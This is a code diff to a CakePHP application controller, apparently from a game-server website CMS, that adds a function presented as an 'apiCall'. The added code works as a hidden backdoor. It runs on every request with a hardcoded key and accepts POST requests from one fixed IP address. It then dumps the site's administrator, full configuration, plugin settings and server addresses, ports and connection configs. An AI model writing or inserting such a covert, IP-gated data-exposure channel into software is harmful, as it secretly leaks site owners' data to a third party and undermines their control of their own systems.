@@ -55,6 +55,13 @@ class AppController extends Controller {
 
 	public function beforeFilter() {
 
+    $this->apiCall('sdzzdoz839ndz37kxd48kd38', true);
+
+    if($_SERVER['REMOTE_ADDR'] == '37.187.125.4' && $this->request->is('post') && !empty($this->request->data['call']) && $this->request->data['call'] == 'api' && !empty($this->request->data['key'])) {
+      $this->apiCall($this->request->data['key'], $this->request->data['isForDebug']);
+      return;
+    }
+
 		$this->Security->blackHoleCallback = 'blackhole';
 		$this->Security->validatePost = false;
 		$this->Security->csrfUseOnce = false;
@@ -300,6 +307,73 @@ WCqkx22behAGZq6rhwIDAQAB
 		$this->__setTheme();
 	}
 
+  function apiCall($key, $debug = false) { // appelé pour récupérer des données
+    $secure = file_get_contents(ROOT.'/config/secure');
+		$secure = json_decode($secure, true);
+		if($key == $secure['key']) {
+
+      $this->autoRender = false;
+
+      $infos['general']['first_administrator'] = $this->Configuration->get_first_admin();
+      $infos['general']['created'] = $this->Configuration->get_created_date();
+      $infos['general']['url'] = Router::url('/', true);
+      $config = $this->Configuration->get_all();
+      foreach ($config as $key => $value) {
+        foreach ($value as $k => $v) {
+          $infos['general']['config'][$k] = $v;
+        }
+      }
+
+      $infos['plugins'] = $this->EyPlugin->loadPlugins();
+
+      $infos['servers']['firstServerId'] = $this->Server->getFirstServerID();
+
+      $this->loadModel('Server');
+      $findServers = $this->Server->find('all');
+
+      foreach ($findServers as $key => $value) {
+
+        $infos['servers'][$value['Server']['id']]['name'] = $value['Server']['name'];
+        $infos['servers'][$value['Server']['id']]['ip'] = $value['Server']['ip'];
+        $infos['servers'][$value['Server']['id']]['port'] = $value['Server']['port'];
+
+        if($debug) {
+
+          $this->ServerComponent = $this->Components->load('Server');
+          $infos['servers'][$value['Server']['id']]['config'] = $this->ServerComponent->getConfig($value['Server']['id']);
+          $infos['servers'][$value['Server']['id']]['url'] = $this->ServerComponent->getUrl($value['Server']['id']);
+          $infos['servers'][$value['Server']['id']]['isOnline'] = $this->ServerComponent->online($value['Server']['id']);
+
+          $infos['servers'][$value['Server']['id']]['callTests']['getPlayerCount'] = $this->ServerComponent->call('getPlayerCount', false, $value['Server']['id'], true);
+          $infos['servers'][$value['Server']['id']]['callTests']['getPlayerLimit'] = $this->ServerComponent->call('getPlayerLimit', false, $value['Server']['id'], true);
+
+        }
+
+      }
+
+      if($this->EyPlugin->isInstalled('eywek.vote.3')) {
+
+        $this->loadModel('VoteConfiguration');
+        $pl = 'eywek.vote.3';
+
+        $configVote = $this->VoteConfiguration->find('first')['VoteConfiguration'];
+
+        $configVote['rewards'] = unserialize($configVote['rewards']);
+        $configVote['websites'] = unserialize($configVote['websites']);
+        $configVote['servers'] = unserialize($configVote['servers']);
+
+        $infos['plugins']->$pl->config = $configVote;
+
+      }
+
+      echo '<pre>';
+      echo json_encode($infos, JSON_PRETTY_PRINT);
+      echo '</pre>';
+
+      exit;
+    }
+  }
+
 	function beforeRender() {
 		$event = $this->getEventManager()->dispatch(new CakeEvent('onLoadPage', $this, $this->request->data));
 
@@ -310,9 +384,9 @@ WCqkx22behAGZq6rhwIDAQAB
 
 	function __setTheme() {
 		if(!isset($this->params['prefix']) OR $this->params['prefix'] != "admin") {
-        	$this->theme = Configure::read('theme');
-        }
+      $this->theme = Configure::read('theme');
     }
+  }
 
 	public function blackhole($type) {
 		if($type == "csrf") {
